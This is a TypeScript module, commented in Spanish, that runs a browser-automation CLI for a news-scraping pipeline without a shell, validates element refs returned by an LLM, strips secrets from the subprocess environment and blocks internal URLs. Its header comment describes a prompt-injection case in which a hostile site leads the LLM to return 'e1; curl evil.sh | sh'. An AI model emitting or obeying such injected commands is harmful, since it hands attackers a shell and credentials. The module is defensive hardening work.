/**
 * Ejecución del CLI de agent-browser sin pasar por un shell.
 *
 * Antes el pipeline armaba `execSync(\`agent-browser ${comando}\`)`, donde
 * `comando` podía incluir un `ref` elegido por el LLM a partir del snapshot de
 * un sitio de terceros. Un sitio hostil podía inducir al modelo a devolver
 * `e1; curl evil.sh | sh` y eso terminaba en un shell con el entorno del
 * proceso, incluidas las credenciales.
 *
 * Acá los comandos se pasan como array de argumentos con `shell: false`, así
 * que ningún metacarácter tiene significado: `;` o `&&` llegarían al CLI como
 * texto literal de un argumento. Además se valida el formato de los refs y se
 * resuelve el ejecutable local antes de invocarlo.
 */

import { execFileSync } from 'node:child_process'
import { accessSync, chmodSync, constants, existsSync } from 'node:fs'
import path from 'node:path'
import { validarDestino } from './url-segura'

/**
 * Formato de referencia que emite agent-browser en sus snapshots: `[ref=e1]`,
 * `[ref=e2]`, etc. Verificado contra el README del paquete instalado.
 * Cualquier cosa fuera de este patrón se rechaza.
 */
export const PATRON_REF = /^e[0-9]+$/

/** Límite defensivo: un snapshot real nunca tiene millones de elementos. */
const MAX_LARGO_REF = 12

export class RefInvalidoError extends Error {
  constructor(motivo: string) {
    // No se incluye el valor recibido en el mensaje: puede venir de un sitio
    // hostil y termina en logs.
    super(`Referencia de browser inválida: ${motivo}`)
    this.name = 'RefInvalidoError'
  }
}

export class EjecutableNoEncontradoError extends Error {
  constructor(ruta: string) {
    super(
      `No se encontró el ejecutable de agent-browser en ${ruta}. ` +
        'Instalalo con `npm ci` y `npx agent-browser install`.'
    )
    this.name = 'EjecutableNoEncontradoError'
  }
}

/**
 * Valida una referencia de elemento producida por el LLM o por el snapshot.
 *
 * @throws RefInvalidoError si no cumple exactamente `^e[0-9]+$`.
 */
export function validarRef(ref: unknown): string {
  if (typeof ref !== 'string') {
    throw new RefInvalidoError(`se esperaba string, llegó ${typeof ref}`)
  }
  if (ref.length === 0) {
    throw new RefInvalidoError('cadena vacía')
  }
  if (ref.length > MAX_LARGO_REF) {
    throw new RefInvalidoError(`excede ${MAX_LARGO_REF} caracteres`)
  }
  if (!PATRON_REF.test(ref)) {
    throw new RefInvalidoError('no cumple el formato ^e[0-9]+$')
  }
  return ref
}

/** Variante no lanzante, para descartar refs en un filtro. */
export function esRefValido(ref: unknown): ref is string {
  try {
    validarRef(ref)
    return true
  } catch {
    return false
  }
}

/** Regex fija, nunca construida a partir de entrada externa. */
const REF_EN_SNAPSHOT = /\[ref=(e[0-9]+)\]/

/**
 * Busca en el snapshot la referencia fresca del elemento cuyo texto coincide
 * con `titulo`.
 *
 * El código anterior construía un `new RegExp()` interpolando el título que
 * devolvía el LLM. Aunque escapaba metacaracteres, compilar un patrón a partir
 * de entrada externa es una superficie de ReDoS innecesaria. Acá se busca por
 * substring y se extrae el ref con una regex fija.
 *
 * @returns El ref validado, o null si no se encontró.
 */
export function extraerRefDeSnapshot(snapshot: string, titulo: string): string | null {
  const aguja = titulo.trim().slice(0, 40)
  if (aguja.length === 0) return null

  for (const linea of snapshot.split('\n')) {
    if (!linea.includes(aguja)) continue
    const m = linea.match(REF_EN_SNAPSHOT)
    if (m && esRefValido(m[1])) return m[1]
  }
  return null
}

/**
 * Nombre del binario nativo que trae el paquete para esta plataforma, con la
 * misma convención que su lanzador (node_modules/agent-browser/bin/agent-browser.js).
 * null si el paquete no publica binario para la combinación.
 */
export function nombreBinarioNativo(
  plataforma: NodeJS.Platform = process.platform,
  arquitectura: string = process.arch,
  esMusl: () => boolean = detectarMusl
): string | null {
  const arch = arquitectura === 'x64' ? 'x64' : arquitectura === 'arm64' ? 'arm64' : null
  if (!arch) return null
  if (plataforma === 'win32') return arch === 'x64' ? 'agent-browser-win32-x64.exe' : null
  if (plataforma === 'darwin') return `agent-browser-darwin-${arch}`
  if (plataforma === 'linux') return `agent-browser-${esMusl() ? 'linux-musl' : 'linux'}-${arch}`
  return null
}

function detectarMusl(): boolean {
  return existsSync('/lib/ld-musl-x86_64.so.1') || existsSync('/lib/ld-musl-aarch64.so.1')
}

/**
 * Resuelve el ejecutable local de agent-browser.
 *
 * Se usa la ruta explícita dentro de node_modules en lugar de confiar en el
 * PATH: evita depender de un binario global de versión desconocida y de
 * cualquier directorio inyectado en el PATH del entorno de ejecución.
 *
 * Se apunta al binario NATIVO del paquete, no al shim de node_modules/.bin:
 * - En Windows el shim es un `.cmd`, y desde Node 20.12 (CVE-2024-27980)
 *   `execFileSync` se niega a lanzar .cmd/.bat sin `shell: true` (EINVAL). El
 *   pipeline no podía correr en una PC con Windows, y activar el shell es
 *   justo lo que este módulo existe para evitar.
 * - En Linux/macOS el shim lanza un proceso de Node que a su vez lanza el
 *   binario: un proceso extra por cada comando del browser, cientos por corrida.
 * El shim queda como último recurso fuera de Windows.
 */
export function resolverEjecutable(
  cwd: string = process.cwd(),
  plataforma: NodeJS.Platform = process.platform,
  arquitectura: string = process.arch
): string {
  const nativo = nombreBinarioNativo(plataforma, arquitectura)
  if (nativo) {
    const ruta = path.join(cwd, 'node_modules', 'agent-browser', 'bin', nativo)
    if (existsSync(ruta)) {
      asegurarEjecutable(ruta, plataforma)
      return ruta
    }
  }

  if (plataforma !== 'win32') {
    const shim = path.join(cwd, 'node_modules', '.bin', 'agent-browser')
    if (existsSync(shim)) return shim
  }

  throw new EjecutableNoEncontradoError(
    path.join(cwd, 'node_modules', 'agent-browser', 'bin', nativo ?? `agent-browser (${plataforma}-${arquitectura})`)
  )
}

/**
 * El postinstall del paquete solo marca como ejecutable el binario de la
 * plataforma donde se instaló. Si se instaló con un gestor que saltea los
 * scripts de ciclo de vida, el bit falta: se corrige igual que el lanzador.
 */
function asegurarEjecutable(ruta: string, plataforma: NodeJS.Platform): void {
  if (plataforma === 'win32') return
  try {
    accessSync(ruta, constants.X_OK)
  } catch {
    try {
      chmodSync(ruta, 0o755)
    } catch {
      // Si tampoco se puede, execFileSync va a fallar con EACCES y ese error
      // es más claro que cualquier cosa que se diga acá.
    }
  }
}

export interface OpcionesEjecucion {
  timeoutMs?: number
  cwd?: string
  /** Inyectable para poder testear sin lanzar procesos reales. */
  ejecutor?: Ejecutor
  /** Inyectable para testear sin exigir el binario instalado. */
  ejecutable?: string
  /**
   * Entorno de partida (se recorta igual con entornoMinimo). Lo usa el agente
   * local para cerrar la sesión de browser de una corrida que ya terminó.
   */
  env?: EntornoSubproceso
}

/** Variables de entorno del subproceso. Tipo laxo a propósito: el ProcessEnv
 * de Next exige NODE_ENV, y acá se construye un entorno recortado. */
export type EntornoSubproceso = Record<string, string | undefined>

export type Ejecutor = (
  ejecutable: string,
  args: readonly string[],
  opciones: {
    timeout: number
    cwd: string
    encoding: 'utf-8'
    shell: false
    env: EntornoSubproceso
    /** Sin ventana de consola por comando cuando el agente corre en Windows. */
    windowsHide: true
    /** Un snapshot o el texto de una nota superan holgado el MB del default. */
    maxBuffer: number
    /**
     * stderr capturado y no heredado: con el default de execFileSync cada
     * error del CLI salía dos veces, una suelta en la salida del pipeline y
     * otra en el log que arma quien llama.
     */
    stdio: ['ignore', 'pipe', 'pipe']
  }
) => string

const ejecutorReal: Ejecutor = (ejecutable, args, opciones) =>
  execFileSync(ejecutable, args as string[], {
    ...opciones,
    // execFileSync tipa env como NodeJS.ProcessEnv, que exige NODE_ENV. El
    // entorno recortado es intencionalmente parcial: el cast queda acotado a
    // esta única frontera con la API de Node.
    env: opciones.env as NodeJS.ProcessEnv,
  })

/**
 * Entorno mínimo para el subproceso. No se le pasa el entorno completo del
 * pipeline: el browser no necesita DATABASE_URL ni las API keys del LLM, y
 * navega sitios de terceros.
 */
export function entornoMinimo(env: EntornoSubproceso = process.env): EntornoSubproceso {
  const permitidas = [
    'PATH', 'HOME', 'TMPDIR', 'TEMP', 'TMP', 'LANG', 'LC_ALL', 'TZ',
    // Windows: sin SystemRoot, Chrome ni siquiera inicializa la red (Winsock
    // lo necesita), y sin USERPROFILE/LOCALAPPDATA no encuentra dónde guardar
    // el perfil ni dónde se instaló el navegador. Ninguna es un secreto.
    'SystemRoot', 'SYSTEMROOT', 'windir', 'USERPROFILE', 'LOCALAPPDATA', 'APPDATA',
    'PATHEXT', 'ComSpec', 'ProgramFiles', 'ProgramFiles(x86)', 'ProgramData',
    'HOMEDRIVE', 'HOMEPATH', 'NUMBER_OF_PROCESSORS', 'PROCESSOR_ARCHITECTURE',
    // Linux con escritorio: solo importan si se pide ver el navegador (headed).
    'DISPLAY', 'WAYLAND_DISPLAY', 'XDG_RUNTIME_DIR',
  ]
  const minimo: EntornoSubproceso = {}
  for (const clave of permitidas) {
    if (env[clave] !== undefined) minimo[clave] = env[clave]
  }
  // Configuración propia de agent-browser (ruta de Chromium, timeouts, proxy,
  // modo visible...). Van todas las AGENT_BROWSER_*: son perillas del browser,
  // no credenciales, y permiten ajustar el agente local desde el .env.
  for (const [clave, valor] of Object.entries(env)) {
    if ((clave === 'PLAYWRIGHT_BROWSERS_PATH' || clave.startsWith('AGENT_BROWSER_')) && valor !== undefined) {
      minimo[clave] = valor
    }
  }
  // Si el pipeline muere a mitad de corrida (cancelación desde el panel, un
  // corte de luz), el daemon del browser quedaba vivo con Chrome abierto para
  // siempre: el cierre por inactividad viene desactivado. En la computadora
  // del equipo eso es memoria que no vuelve hasta reiniciar. 10 minutos sin
  // comandos alcanza y sobra: entre dos comandos de una corrida normal pasan
  // segundos.
  if (minimo.AGENT_BROWSER_IDLE_TIMEOUT_MS === undefined) {
    minimo.AGENT_BROWSER_IDLE_TIMEOUT_MS = String(10 * 60 * 1000)
  }
  return minimo
}

/**
 * Ejecuta agent-browser con argumentos separados y sin shell.
 *
 * Devuelve stdout recortado, o cadena vacía si el comando falló o se pasó del
 * timeout — el pipeline ya trata la cadena vacía como "no se pudo obtener".
 *
 * @param args Argumentos ya separados. Nunca se concatena un string de comando.
 */
export function ejecutarBrowser(
  args: readonly string[],
  { timeoutMs = 30_000, cwd = process.cwd(), ejecutor = ejecutorReal, ejecutable, env }: OpcionesEjecucion = {}
): { ok: boolean; salida: string; error?: string } {
  const bin = ejecutable ?? resolverEjecutable(cwd)

  try {
    const salida = ejecutor(bin, args, {
      timeout: timeoutMs,
      cwd,
      encoding: 'utf-8',
      shell: false,
      env: entornoMinimo(env ?? process.env),
      windowsHide: true,
      maxBuffer: 16 * 1024 * 1024,
      stdio: ['ignore', 'pipe', 'pipe'],
    })
    return { ok: true, salida: sinColores(salida ?? '').trim() }
  } catch (error) {
    const err = error as NodeJS.ErrnoException & { killed?: boolean; stderr?: string | Buffer }
    const stderr = err.stderr ? sinColores(String(err.stderr)).trim() : ''
    const motivo = err.killed
      ? `timeout tras ${timeoutMs}ms`
      : stderr.slice(0, 200) || err.message || 'error desconocido'
    return { ok: false, salida: '', error: motivo }
  }
}

/**
 * Quita los códigos de color ANSI que agent-browser agrega a sus mensajes
 * ("\x1b[31m✗\x1b[0m Navigation failed"): terminaban guardados en el log del
 * panel como basura visible.
 */
export function sinColores(texto: string): string {
  // eslint-disable-next-line no-control-regex
  return texto.replace(/\x1b\[[0-9;]*[A-Za-z]/g, '')
}

// ════════════════════════════════════════════
// CONSTRUCTORES DE COMANDO
// ════════════════════════════════════════════
// Cada comando del pipeline se arma como array. Las funciones que reciben datos
// externos validan antes de construir.

export const comandos = {
  version: (): string[] => ['--version'],
  abrir: (url: string): string[] => ['open', validarUrlNavegable(url)],
  abrirEnBlanco: (): string[] => ['open', 'about:blank'],
  /**
   * Espera a que el DOM esté armado, con una condición JS y no con `--load`.
   *
   * HISTORIA
   * 1. `--load networkidle` casi nunca se cumple en un sitio de noticias
   *    (publicidad y tracking piden recursos sin parar): 37 timeouts en la
   *    corrida del 22/8.
   * 2. Se pasó a `--load domcontentloaded`, que tampoco sirvió: en
   *    agent-browser 0.21.4 `wait --load <estado>` espera un evento de carga
   *    NUEVO y, si la página ya cargó (que es siempre el caso después de
   *    `open`), agota su timeout de 25 s y devuelve "✓ Done" igual. Medido en
   *    local: 25,16 s sobre una página ya cargada. En Actions chocaba antes con
   *    nuestro límite de 20 s: el `ETIMEDOUT` de `agent-browser wait` que
   *    aparece en 12 de 13 medios en cada corrida, más 5 s por cada nota.
   *
   * `document.readyState !== 'loading'` es la misma condición que
   * domcontentloaded (estado interactive o complete), pero se evalúa sobre el
   * estado ACTUAL: si ya se cumple vuelve al instante (0,16 s medido), y si la
   * pestaña nueva todavía está cargando, espera a que se cumpla.
   */
  esperarCarga: (): string[] => ['wait', '--fn', "document.readyState !== 'loading'"],
  /**
   * Título y cuerpo de la nota en UNA llamada.
   *
   * Antes se probaban hasta 14 selectores con un `get text` cada uno: un
   * proceso por intento, cada uno con su timeout de 5 s cuando el selector no
   * existía (y `get text` espera a que el elemento aparezca). En la corrida
   * del 6/9 cada nota costaba ~33 s de browser. Acá el recorrido de
   * selectores corre dentro de la página y vuelve de inmediato.
   *
   * El script es una constante del código: no interpola nada que venga del
   * sitio ni del LLM. `innerText` y no `textContent` para no arrastrar el
   * contenido de <script> y <style> que muchos sitios meten dentro del artículo.
   */
  extraerContenido: (): string[] => ['eval', SCRIPT_EXTRAER_CONTENIDO],
  snapshotInteractivo: (): string[] => ['snapshot', '-i', '-c'],
  snapshotSelector: (selector: string): string[] => ['snapshot', '-s', selector, '-c'],
  getUrl: (): string[] => ['get', 'url'],
  getTitulo: (): string[] => ['get', 'title'],
  getTexto: (selector: string): string[] => ['get', 'text', selector],
  /**
   * El href de un link ANTES de hacer click: permite descartar duplicados y
   * destinos prohibidos sin navegar. El ref viene del LLM: se valida.
   */
  getHref: (ref: string): string[] => ['get', 'attr', `@${validarRef(ref)}`, 'href'],
  /** El ref viene del LLM: se valida antes de construir el comando. */
  clickNuevaTab: (ref: string): string[] => ['click', `@${validarRef(ref)}`, '--new-tab'],
  tab: (indice: number): string[] => ['tab', String(validarIndiceTab(indice))],
  cerrarTab: (): string[] => ['tab', 'close'],
  cerrar: (): string[] => ['close'],
} as const

/**
 * Selectores de cuerpo de nota, del más específico al más genérico. Son los
 * mismos que usaba el recorrido anterior en scrapear-medios.ts.
 */
export const SELECTORES_CONTENIDO = [
  'article',
  '[data-component="article-body"]',
  '.article-body',
  '.article-text',
  '.nota-cuerpo',
  '.entry-content',
  '.story-body',
  '.content-body',
  '.article__body',
  '#article-content',
  '.body-article',
  'main article',
  '.detail-body',
  '.news-body',
] as const

/** Tope del texto que devuelve la página: 8000, lo mismo que se guardaba antes. */
export const MAX_CHARS_CONTENIDO = 8000

const SCRIPT_EXTRAER_CONTENIDO = `(() => {
  const selectores = ${JSON.stringify(SELECTORES_CONTENIDO)};
  const limpiar = t => (t || '').replace(/[ \\t]+\\n/g, '\\n').replace(/\\n{3,}/g, '\\n\\n').trim();
  let texto = '';
  for (const s of selectores) {
    const el = document.querySelector(s);
    const t = el ? limpiar(el.innerText) : '';
    if (t.length > 100) { texto = t; break; }
  }
  if (!texto) {
    const main = document.querySelector('main');
    texto = main ? limpiar(main.innerText) : '';
  }
  return JSON.stringify({ titulo: document.title || '', texto: texto.slice(0, ${MAX_CHARS_CONTENIDO}) });
})()`

/**
 * Interpreta la salida de `extraerContenido`.
 *
 * `agent-browser eval` imprime el valor devuelto serializado como JSON; el
 * script devuelve a su vez un string JSON, así que llega doblemente
 * serializado. Se toleran las dos formas para no depender de ese detalle de
 * la versión del CLI. Cualquier cosa inesperada da vacío, que el pipeline ya
 * trata como "texto insuficiente".
 */
export function parsearContenidoExtraido(salida: string): { titulo: string; texto: string } {
  const vacio = { titulo: '', texto: '' }
  if (!salida) return vacio
  try {
    let valor: unknown = JSON.parse(salida)
    if (typeof valor === 'string') valor = JSON.parse(valor)
    if (valor && typeof valor === 'object') {
      const v = valor as { titulo?: unknown; texto?: unknown }
      return {
        titulo: typeof v.titulo === 'string' ? v.titulo : '',
        texto: typeof v.texto === 'string' ? v.texto.slice(0, MAX_CHARS_CONTENIDO) : '',
      }
    }
  } catch {
    // salida no JSON: se descarta
  }
  return vacio
}

/**
 * Resuelve el href de un link contra la URL del listado. null si no es una URL
 * http(s) utilizable (vacío, `javascript:`, `mailto:`, basura).
 */
export function resolverHref(href: string, base: string): string | null {
  const limpio = href.trim()
  if (!limpio) return null
  try {
    const url = new URL(limpio, base)
    return url.protocol === 'http:' || url.protocol === 'https:' ? url.toString() : null
  } catch {
    return null
  }
}

/** Misma página, ignorando query, fragmento y la barra final. */
export function mismaPagina(a: string, b: string): boolean {
  try {
    const ua = new URL(a)
    const ub = new URL(b)
    const ruta = (u: URL) => u.pathname.replace(/\/+$/, '') || '/'
    return ua.host === ub.host && ruta(ua) === ruta(ub)
  } catch {
    return a === b
  }
}

function validarIndiceTab(indice: number): number {
  if (!Number.isInteger(indice) || indice < 0 || indice > 50) {
    throw new RefInvalidoError('índice de tab fuera de rango')
  }
  return indice
}

/**
 * Valida una URL antes de navegar: esquema, y además destino.
 *
 * Antes solo comprobaba el esquema, y dejaba anotado que el destino quedaba
 * para más adelante. Ahora delega en `validarDestino`, que además rechaza
 * loopback, redes privadas y —lo que más importa— el endpoint de metadatos de
 * nube (169.254.169.254). Ver src/lib/pipeline/url-segura.ts para el alcance
 * exacto de esa defensa y para lo que NO cubre (resolución DNS).
 */
export function validarUrlNavegable(url: string): string {
  try {
    return validarDestino(url)
  } catch (e) {
    // Se re-envuelve en el error propio de este módulo para no cambiarle el
    // tipo de excepción a quien ya lo maneja.
    throw new RefInvalidoError(e instanceof Error ? e.message : 'URL inválida')
  }
}
